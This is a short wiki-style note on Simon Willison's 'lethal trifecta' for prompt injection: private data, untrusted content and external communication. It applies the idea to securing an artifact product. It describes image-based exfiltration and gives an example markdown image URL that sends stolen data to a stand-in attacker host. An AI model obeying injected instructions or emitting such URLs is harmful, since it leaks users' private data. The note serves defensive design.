# The Lethal Trifecta

[[Simon Willison]]'s framing (June 2025) for why rendering LLM-generated content is structurally dangerous — and the security counterweight to the whole HTML-as-artifact thesis.

## The Three Legs

Any agent or artifact that combines all three is exploitable via prompt injection:

1. **Access to private data**
2. **Exposure to untrusted content**
3. **The ability to externally communicate (exfiltrate)**

> "LLMs follow instructions in content. This is what makes them so useful." And: "If a tool can make an HTTP request — to an API, or to load an image — that tool can be used to pass stolen information back."

The fix isn't a model-level guardrail (untrusted content reaches the model regardless); it's to **remove one leg** — most practically, network isolation to kill exfiltration.

## The Concrete Attack: Image Exfiltration

The recurring real-world version: an injected instruction makes the assistant render an image (`![x](https://attacker/?q=<stolen-data>)`) — the image loads automatically and leaks data in the URL, *no click required*. Willison has tracked this across Mistral LeChat, Slack AI, Microsoft 365 Copilot, GitLab Duo, Salesforce Agentforce, Superhuman, ChatGPT, Gemini/Antigravity, Amazon Q, NotebookLM — "as far as the eye can see." It applies to both [[Markdown]] images and HTML markup.

## Why It Matters for Archetype

A product-vision artifact is the dangerous case by construction: it ingests private context (the "why," internal data) → leg 1; if it renders generated images or makes requests → leg 3. So a "living document" artifact must ship with a **deny-by-default CSP** (no arbitrary `img-src`/`connect-src`) as a non-negotiable default, not an option. See [[Sandboxing LLM-Generated HTML]] and [[Implications for Archetype]].

## See Also
- [[Sandboxing LLM-Generated HTML]] · [[The Case Against HTML]] · [[Markdown]]
- [[Simon Willison]] · [[Implications for Archetype]]
